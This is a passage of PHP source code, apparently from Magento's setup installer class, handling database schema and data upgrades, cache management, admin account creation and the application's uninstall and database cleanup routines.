        $this->assertDbConfigExists();
        $this->assertDbAccessible();
        $setup = $this->dataSetupFactory->create();
        $this->checkFilePermissionsForDbUpgrade();
        $this->log->log('Data install/update:');

        if ($frontendCaches) {
            $this->log->log('Disabling caches:');
            $this->updateCaches(false, $frontendCaches);
        }

        try {
            $this->handleDBSchemaData($setup, 'data', $request);
        } finally {
            if ($frontendCaches) {
                $this->log->log('Enabling caches:');
                $this->updateCaches(true, $frontendCaches);
            }
        }

        $registry->unregister('setup-mode-enabled');
    }

    /**
     * Check permissions of directories that are expected to be writable for database upgrade
     *
     * @return void
     * @throws \Exception If some of the required directories isn't writable
     */
    public function checkFilePermissionsForDbUpgrade()
    {
        $this->throwExceptionForNotWritablePaths(
            $this->filePermissions->getMissingWritableDirectoriesForDbUpgrade()
        );
    }

    /**
     * Throws exception with appropriate message if given not empty array of paths that requires writing permission
     *
     * @param array $paths List of not writable paths
     * @return void
     * @throws \Exception If given not empty array of not writable paths
     */
    private function throwExceptionForNotWritablePaths(array $paths)
    {
        if ($paths) {
            $errorMsg = "Missing write permissions to the following paths:" . PHP_EOL . implode(PHP_EOL, $paths);
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new \Exception($errorMsg);
        }
    }

    /**
     * Handle database schema and data (install/upgrade/backup/uninstall etc)
     *
     * @param SchemaSetupInterface|ModuleDataSetupInterface $setup
     * @param string $type
     * @param array $request
     * @return void
     * @throws \Magento\Framework\Setup\Exception
     * @throws Exception
     * @SuppressWarnings(PHPMD.CyclomaticComplexity)
     * @SuppressWarnings(PHPMD.NPathComplexity)
     * @SuppressWarnings(PHPMD.ExcessiveMethodLength)
     */
    private function handleDBSchemaData($setup, $type, array $request)
    {
        if ($type !== 'schema' && $type !== 'data') {
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw  new Exception("Unsupported operation type $type is requested");
        }
        $resource = new \Magento\Framework\Module\ModuleResource($this->context);
        $verType = $type . '-version';
        $installType = $type . '-install';
        $upgradeType = $type . '-upgrade';
        $moduleNames = $this->moduleList->getNames();
        $moduleContextList = $this->generateListOfModuleContext($resource, $verType);
        /** @var Mysql $adapter */
        $adapter = $setup->getConnection();
        $schemaListener = $adapter->getSchemaListener();
        $this->patchApplierFactory = $this->objectManagerProvider->get()->create(
            PatchApplierFactory::class,
            [
                'objectManager' => $this->objectManagerProvider->get()
            ]
        );

        $patchApplierParams = $type === 'schema' ?
            ['schemaSetup' => $setup] :
            ['moduleDataSetup' => $setup, 'objectManager' => $this->objectManagerProvider->get()];

        /** @var PatchApplier $patchApplier */
        $patchApplier = $this->patchApplierFactory->create($patchApplierParams);

        foreach ($moduleNames as $moduleName) {
            if ($this->isDryRun($request)) {
                $this->log->log("Module '{$moduleName}':");
                $this->logProgress();
                continue;
            }
            $schemaListener->setModuleName($moduleName);
            $this->log->log("Module '{$moduleName}':");
            $configVer = $this->moduleList->getOne($moduleName)['setup_version'];
            $currentVersion = $moduleContextList[$moduleName]->getVersion();
            // Schema/Data is installed
            if ($currentVersion !== '') {
                $status = version_compare($configVer, $currentVersion);
                if ($status == \Magento\Framework\Setup\ModuleDataSetupInterface::VERSION_COMPARE_GREATER) {
                    $upgrader = $this->getSchemaDataHandler($moduleName, $upgradeType);
                    if ($upgrader) {
                        $this->log->logInline("Upgrading $type.. ");
                        $upgrader->upgrade($setup, $moduleContextList[$moduleName]);
                        if ($type === 'schema') {
                            $resource->setDbVersion($moduleName, $configVer);
                        } elseif ($type === 'data') {
                            $resource->setDataVersion($moduleName, $configVer);
                        }
                    }
                }
            } elseif ($configVer) {
                $installer = $this->getSchemaDataHandler($moduleName, $installType);
                if ($installer) {
                    $this->log->logInline("Installing $type... ");
                    $installer->install($setup, $moduleContextList[$moduleName]);
                }
                $upgrader = $this->getSchemaDataHandler($moduleName, $upgradeType);
                if ($upgrader) {
                    $this->log->logInline("Upgrading $type... ");
                    $upgrader->upgrade($setup, $moduleContextList[$moduleName]);
                }
            }

            if ($configVer) {
                if ($type === 'schema') {
                    $resource->setDbVersion($moduleName, $configVer);
                } elseif ($type === 'data') {
                    $resource->setDataVersion($moduleName, $configVer);
                }
            }

            /**
             * Applying data patches after old upgrade data scripts
             */
            if ($type === 'schema') {
                $patchApplier->applySchemaPatch($moduleName);
            } elseif ($type === 'data') {
                $patchApplier->applyDataPatch($moduleName);
            }

            $this->logProgress();
        }

        if ($type === 'schema') {
            $this->log->log('Schema post-updates:');
        } elseif ($type === 'data') {
            $this->log->log('Data post-updates:');
        }
        $handlerType = $type === 'schema' ? 'schema-recurring' : 'data-recurring';

        foreach ($moduleNames as $moduleName) {
            if ($this->isDryRun($request)) {
                $this->log->log("Module '{$moduleName}':");
                $this->logProgress();
                continue;
            }
            $this->log->log("Module '{$moduleName}':");
            $modulePostUpdater = $this->getSchemaDataHandler($moduleName, $handlerType);
            if ($modulePostUpdater) {
                $this->log->logInline('Running ' . str_replace('-', ' ', $handlerType) . '...');
                $modulePostUpdater->install($setup, $moduleContextList[$moduleName]);
            }
            $this->logProgress();
        }
    }

    /**
     * Assert DbConfigExists
     *
     * @return void
     * @throws Exception
     * @throws FileSystemException
     * @throws RuntimeException
     */
    private function assertDbConfigExists()
    {
        $config = $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT);
        if (!$config) {
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new Exception(
                "Can't run this operation: configuration for DB connection is absent."
            );
        }
    }

    /**
     * Check whether Magento setup is run in dry-run mode
     *
     * @param array $request
     * @return bool
     */
    private function isDryRun(array $request)
    {
        return isset($request[DryRunLogger::INPUT_KEY_DRY_RUN_MODE]) &&
            $request[DryRunLogger::INPUT_KEY_DRY_RUN_MODE];
    }

    /**
     * Installs user configuration
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws Exception
     * @throws LocalizedException
     */
    public function installUserConfig($data)
    {
        if ($this->isDryRun($data)) {
            return;
        }
        $userConfig = new StoreConfigurationDataMapper();
        /** @var \Magento\Framework\App\State $appState */
        $appState = $this->objectManagerProvider->get()->get(\Magento\Framework\App\State::class);
        $appState->setAreaCode(\Magento\Framework\App\Area::AREA_GLOBAL);
        $configData = $userConfig->getConfigData($data);
        if (count($configData) === 0) {
            return;
        }

        /** @var \Magento\Config\Model\Config\Factory $configFactory */
        $configFactory = $this->objectManagerProvider->get()->create(\Magento\Config\Model\Config\Factory::class);
        foreach ($configData as $key => $val) {
            $configModel = $configFactory->create();
            $configModel->setDataByPath($key, $val);
            $configModel->save();
        }
    }

    /**
     * Configure search engine on install
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws ValidationException
     * @throws Exception
     */
    public function installSearchConfiguration($data)
    {
        /** @var SearchConfig $searchConfig */
        $searchConfig = $this->objectManagerProvider->get()->get(SearchConfig::class);
        $searchConfig->saveConfiguration($data);
    }

    /**
     * Validate remote storage on install.  Since it is a deployment-based configuration, the config is already present,
     * but this function confirms it can connect after Object Manager
     * has all necessary dependencies loaded to do so.
     *
     * @param array $data
     * @throws ValidationException
     * @throws Exception
     */
    public function validateRemoteStorageConfiguration(array $data)
    {
        try {
            $remoteStorageValidator = $this->objectManagerProvider->get()->get(RemoteStorageValidator::class);
        } catch (ReflectionException $e) { // RemoteStorage module is not available; return early
            return;
        }

        $validationErrors = $remoteStorageValidator->validate($data, $this->deploymentConfig);

        if (!empty($validationErrors)) {
            $this->revertRemoteStorageConfiguration();
            throw new ValidationException(__(implode(PHP_EOL, $validationErrors)));
        }
    }

    /**
     * Create data handler
     *
     * @param string $className
     * @param string $interfaceName
     * @return mixed|null
     * @throws Exception
     */
    protected function createSchemaDataHandler($className, $interfaceName)
    {
        if (class_exists($className)) {
            if (!is_subclass_of($className, $interfaceName) && $className !== $interfaceName) {
                // phpcs:ignore Magento2.Exceptions.DirectThrow
                throw  new Exception($className . ' must implement \\' . $interfaceName);
            } else {
                return $this->objectManagerProvider->get()->create($className);
            }
        }
        return null;
    }

    /**
     * Create store order increment prefix configuration
     *
     * @param string $orderIncrementPrefix Value to use for order increment prefix
     * @return void
     *
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     */
    private function installOrderIncrementPrefix($orderIncrementPrefix)
    {
        $setup = $this->setupFactory->create($this->context->getResources());
        $dbConnection = $setup->getConnection();

        // get entity_type_id for order
        $select = $dbConnection->select()
            ->from($setup->getTable('eav_entity_type'), 'entity_type_id')
            ->where('entity_type_code = \'order\'');
        $entityTypeId = $dbConnection->fetchOne($select);

        // See if row already exists
        $incrementRow = $dbConnection->fetchRow(
            'SELECT * FROM ' . $setup->getTable('eav_entity_store') . ' WHERE entity_type_id = ? AND store_id = ?',
            [$entityTypeId, Store::DISTRO_STORE_ID]
        );

        if (!empty($incrementRow)) {
            // row exists, update it
            $entityStoreId = $incrementRow['entity_store_id'];
            $dbConnection->update(
                $setup->getTable('eav_entity_store'),
                ['increment_prefix' => $orderIncrementPrefix],
                ['entity_store_id' => $entityStoreId]
            );
        } else {
            // add a row to the store's eav table, setting the increment_prefix
            $rowData = [
                'entity_type_id' => $entityTypeId,
                'store_id' => Store::DISTRO_STORE_ID,
                'increment_prefix' => $orderIncrementPrefix,
            ];
            $dbConnection->insert($setup->getTable('eav_entity_store'), $rowData);
        }
    }

    /**
     * Create admin account
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws Exception
     * @throws FileSystemException
     * @throws RuntimeException
     */
    public function installAdminUser($data)
    {
        if ($this->isDryRun($data)) {
            return;
        }

        $adminUserModuleIsInstalled = (bool)$this->deploymentConfig->get('modules/Magento_User');
        //Admin user data is not system data, so we need to install it only if schema for admin user was installed
        if ($adminUserModuleIsInstalled) {
            $this->assertDbConfigExists();
            $data += ['db-prefix' => $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_PREFIX)];
            $setup = $this->setupFactory->create($this->context->getResources());
            $adminAccount = $this->adminAccountFactory->create($setup->getConnection(), (array)$data);
            $adminAccount->save();
        }
    }

    /**
     * Updates modules in deployment configuration
     *
     * @param bool $keepGeneratedFiles Cleanup generated classes and view files and reset ObjectManager
     * @return void
     * @throws Exception
     */
    public function updateModulesSequence($keepGeneratedFiles = false)
    {
        $config = $this->deploymentConfig->get(ConfigOptionsListConstants::KEY_MODULES);
        if (!$config) {
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new Exception(
                "Can't run this operation: deployment configuration is absent."
                . " Run 'magento setup:config:set --help' for options."
            );
        }
        $this->flushCaches([ConfigCache::TYPE_IDENTIFIER]);
        $this->cleanCaches();
        if (!$keepGeneratedFiles) {
            $this->cleanupGeneratedFiles();
        }
        $this->log->log('Updating modules:');
        $this->createModulesConfig([]);
    }

    /**
     * Get the modules config as Magento sees it
     *
     * @return array
     * @throws \LogicException
     */
    public function getModulesConfig()
    {
        return $this->createModulesConfig([], true);
    }

    /**
     * Uninstall Magento application
     *
     * @return void
     */
    public function uninstall()
    {
        $this->log->log('Starting Magento uninstallation:');

        try {
            $this->cleanCaches();
        } catch (\Exception $e) {
            $this->log->log(
                'Can\'t clear cache due to the following error: '
                . $e->getMessage() . PHP_EOL
                . 'To fully clean up your uninstallation, you must manually clear your cache.'
            );
        }

        $this->cleanupDb();

        $this->log->log('File system cleanup:');
        $messages = $this->cleanupFiles->clearAllFiles();
        foreach ($messages as $message) {
            $this->log->log($message);
        }

        $this->deleteDeploymentConfig();

        $this->log->logSuccess('Magento uninstallation complete.');
    }

    /**
     * Enable or disable caches for specific types that are available
     *
     * If no types are specified then it will enable or disable all available types
     * Note this is called by install() via callback.
     *
     * @param bool $isEnabled
     * @param array $types
     * @return void
     * @throws Exception
     */
    private function updateCaches($isEnabled, $types = [])
    {
        /** @var Manager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->create(Manager::class);

        $availableTypes = $cacheManager->getAvailableTypes();
        $types = empty($types) ? $availableTypes : array_intersect($availableTypes, $types);
        $enabledTypes = $cacheManager->setEnabled($types, $isEnabled);
        if ($isEnabled) {
            $cacheManager->clean($enabledTypes);
        }

        // Only get statuses of specific cache types
        $cacheStatus = array_filter(
            $cacheManager->getStatus(),
            function (string $key) use ($types) {
                return in_array($key, $types);
            },
            ARRAY_FILTER_USE_KEY
        );

        $this->log->log('Current status:');
        foreach ($cacheStatus as $cache => $status) {
            $this->log->log(sprintf('%s: %d', $cache, $status));
        }
    }

    /**
     * Clean caches after installing application
     *
     * @return void
     *
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     * @throws Exception
     */
    private function cleanCaches()
    {
        /** @var Manager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->get(Manager::class);
        $types = $cacheManager->getAvailableTypes();
        $cacheManager->clean($types);
        $this->log->log('Cache cleared successfully');
    }

    /**
     * Flush caches for specific types or all available types
     *
     * @param array $types
     * @return void
     *
     * @throws Exception
     */
    private function flushCaches($types = [])
    {
        /** @var Manager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->get(Manager::class);
        $types = empty($types) ? $cacheManager->getAvailableTypes() : $types;
        $cacheManager->flush($types);
        $this->log->log('Cache types ' . implode(',', $types) . ' flushed successfully');
    }

    /**
     * Enables or disables maintenance mode for Magento application
     *
     * @param int $value
     * @return void
     *
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     */
    private function setMaintenanceMode($value)
    {
        $this->maintenanceMode->set($value);
    }

    /**
     * Return messages
     *
     * @return array
     */
    public function getInstallInfo()
    {
        return $this->installInfo;
    }

    /**
     * Deletes the database and creates it again
     *
     * @return void
     */
    public function cleanupDb()
    {
        $cleanedUpDatabases = [];
        $connections = $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTIONS, []);
        //Do database cleanup for all shards
        foreach ($connections as $config) {
            try {
                $connection = $this->connectionFactory->create($config);
                if (!$connection) {
                    $this->log->log("Can't create connection to database - skipping database cleanup");
                }
            } catch (\Exception $e) {
                $this->log->log($e->getMessage() . ' - skipping database cleanup');
                return;
            }

            $dbName = $connection->quoteIdentifier($config[ConfigOptionsListConstants::KEY_NAME]);
            //If for different shards one database was specified - no need to clean it few times
            if (!in_array($dbName, $cleanedUpDatabases)) {
                $this->log->log("Cleaning up database {$dbName}");
                // phpcs:ignore Magento2.SQL.RawQuery
                $connection->query("DROP DATABASE IF EXISTS {$dbName}");
                // phpcs:ignore Magento2.SQL.RawQuery
                $connection->query("CREATE DATABASE IF NOT EXISTS {$dbName}");
                $cleanedUpDatabases[] = $dbName;
            }
        }

        if (empty($config)) {
            $this->log->log('No database connection defined - skipping database cleanup');
        }
    }

    /**
     * Removes deployment configuration
     *
     * @return void
     * @throws FileSystemException
     */
    private function deleteDeploymentConfig()
    {
        $configDir = $this->filesystem->getDirectoryWrite(DirectoryList::CONFIG);
        $configFiles = $this->deploymentConfigReader->getFiles();
        foreach ($configFiles as $configFile) {
            $absolutePath = $configDir->getAbsolutePath($configFile);
            if (!$configDir->isFile($configFile)) {
                $this->log->log("The file '{$absolutePath}' doesn't exist - skipping cleanup");
                continue;
            }
            try {
                $this->log->log($absolutePath);
                $configDir->delete($configFile);
            } catch (FileSystemException $e) {
                $this->log->log($e->getMessage());
            }
        }
    }

    /**
     * Validates that MySQL is accessible and MySQL version is supported
     *
     * @return void
     * @throws Exception
     * @throws FileSystemException
     * @throws RuntimeException
     */
    private function assertDbAccessible()
    {
        $driverOptionKeys = [
            ConfigOptionsListConstants::KEY_MYSQL_SSL_KEY =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_KEY,

            ConfigOptionsListConstants::KEY_MYSQL_SSL_CERT =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_CERT,

            ConfigOptionsListConstants::KEY_MYSQL_SSL_CA =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_CA,

            ConfigOptionsListConstants::KEY_MYSQL_SSL_VERIFY =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_VERIFY
        ];
        $driverOptions = [];
        foreach ($driverOptionKeys as $driverOptionKey => $driverOptionConfig) {
            $config = $this->deploymentConfig->get($driverOptionConfig);
            if ($config !== null) {
                $driverOptions[$driverOptionKey] = $config;
            }
        }

        $this->dbValidator->checkDatabaseConnectionWithDriverOptions(
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_NAME
            ),
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_HOST
            ),
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_USER
            ),
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_PASSWORD
            ),
            $driverOptions
        );
        $prefix = $this->deploymentConfig->get(
            ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
            '/' . ConfigOptionsListConstants::KEY_PREFIX
        );
        if (null !== $prefix) {
            $this->dbValidator->checkDatabaseTablePrefix($prefix);
        }
    }

    /**
     * Get handler for schema or data install/upgrade/backup/uninstall etc.
     *
     * @param string $moduleName
     * @param string $type
     * @return InstallSchemaInterface | UpgradeSchemaInterface | InstallDataInterface | UpgradeDataInterface | null
     * @throws Exception
     */
    private function getSchemaDataHandler($moduleName, $type)
    {
        $className = str_replace('_', '\\', $moduleName) . '\Setup';
        switch ($type) {
            case 'schema-install':
                $className .= '\InstallSchema';
                $interface = self::SCHEMA_INSTALL;
                break;
            case 'schema-upgrade':
                $className .= '\UpgradeSchema';
                $interface = self::SCHEMA_UPGRADE;
                break;
            case 'schema-recurring':
                $className .= '\Recurring';
                $interface = self::SCHEMA_INSTALL;
                break;
            case 'data-install':
                $className .= '\InstallData';
                $interface = self::DATA_INSTALL;
                break;
            case 'data-upgrade':
                $className .= '\UpgradeData';
                $interface = self::DATA_UPGRADE;
                break;
            case 'data-recurring':
                $className .= '\RecurringData';
                $interface = self::DATA_INSTALL;
                break;
            default:
                // phpcs:ignore Magento2.Exceptions.DirectThrow
                throw new Exception("$className does not exist");
        }

        return $this->createSchemaDataHandler($className, $interface);
    }

    /**
     * Generates list of ModuleContext
     *
     * @param \Magento\Framework\Module\ModuleResource $resource
     * @param string $type
     * @return ModuleContext[]
     * @throws Exception
     */
    private function generateListOfModuleContext($resource, $type)
    {
        $moduleContextList = [];
        foreach ($this->moduleList->getNames() as $moduleName) {
            if ($type === 'schema-version') {
                $dbVer = $resource->getDbVersion($moduleName);
            } elseif ($type === 'data-version') {
                $dbVer = $resource->getDataVersion($moduleName);
            } else {
                // phpcs:ignore Magento2.Exceptions.DirectThrow
                throw  new Exception("Unsupported version type $type is requested");
            }
            if ($dbVer !== false) {
                $moduleContextList[$moduleName] = new ModuleContext($dbVer);
            } else {
                $moduleContextList[$moduleName] = new ModuleContext('');
            }
        }
        return $moduleContextList;
    }

    /**
     * Clear generated/code and reset object manager
     *
     * @return void
     */
    private function cleanupGeneratedFiles()
    {
        $this->log->log('File system cleanup:');
        $messages = $this->cleanupFiles->clearCodeGeneratedFiles();

        // unload Magento autoloader because it may be using compiled definition
        foreach (spl_autoload_functions() as $autoloader) {
            if (is_array($autoloader) && $autoloader[0] instanceof \Magento\Framework\Code\Generator\Autoloader) {
                spl_autoload_unregister([$autoloader[0], $autoloader[1]]);
                break;
            }
        }

        // Corrected Magento autoloader will be loaded upon next get() call on $this->objectManagerProvider
        $this->objectManagerProvider->reset();

        foreach ($messages as $message) {
            $this->log->log($message);
        }
    }

    /**
     * Checks that admin data is not empty in request array
     *
     * @param \ArrayObject|array $request
     * @return bool
     */
    private function isAdminDataSet($request)
    {
        $adminData = array_filter(
            $request,
            function ($value, $key) {
                return in_array(
                    $key,
                    [
                        AdminAccount::KEY_EMAIL,
                        AdminAccount::KEY_FIRST_NAME,
                        AdminAccount::KEY_LAST_NAME,
                        AdminAccount::KEY_USER,
                        AdminAccount::KEY_PASSWORD,
                    ]
                ) && $value !== null;
            },
            ARRAY_FILTER_USE_BOTH
        );

        return !empty($adminData);
    }

    /**
     * Update flag_data column data type to maintain consistency.
     *
     * @param AdapterInterface $connection
     * @param string $tableName
     * @param string $columnName
     * @param string $typeName
     */
    private function updateColumnType(
        AdapterInterface $connection,
        string $tableName,
        string $columnName,
        string $typeName
    ): void {
        $tableDescription = $connection->describeTable($tableName);
        if ($tableDescription[$columnName]['DATA_TYPE'] !== $typeName) {
            $connection->modifyColumn(
                $tableName,
                $columnName,
                $typeName
            );
        }
    }

    /**
     * Remove unused triggers from db
     *
     * @throws \Exception
     */
    public function removeUnusedTriggers(): void
    {
        $this->triggerCleaner->removeTriggers();
        $this->cleanCaches();
    }

    /**
     * Returns list of disabled cache types
     *
     * @param array $cacheTypesToCheck
     * @return array
     */
    private function getDisabledCacheTypes(array $cacheTypesToCheck): array
    {
        $disabledCaches = [];

        /** @var CacheManager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->create(CacheManager::class);
        $cacheStatus = $cacheManager->getStatus();

        foreach ($cacheTypesToCheck as $cacheType) {
            if (isset($cacheStatus[$cacheType]) && $cacheStatus[$cacheType] === 0) {
                $disabledCaches[] = $cacheType;
            }
        }

        return $disabledCaches;
    }

    /**
     * Revert remote storage configuration back to local file driver
     */
    private function revertRemoteStorageConfiguration()
    {
        if (!$this->deploymentConfigWriter->checkIfWritable()) {
            return;
        }

        $remoteStorageData = new ConfigData(ConfigFilePool::APP_ENV);
        $remoteStorageData->set('remote_storage', ['driver' => 'file']);
        $configData = [$remoteStorageData->getFileKey() => $remoteStorageData->getData()];
        $this->deploymentConfigWriter->saveConfig($configData, true);
    }
}
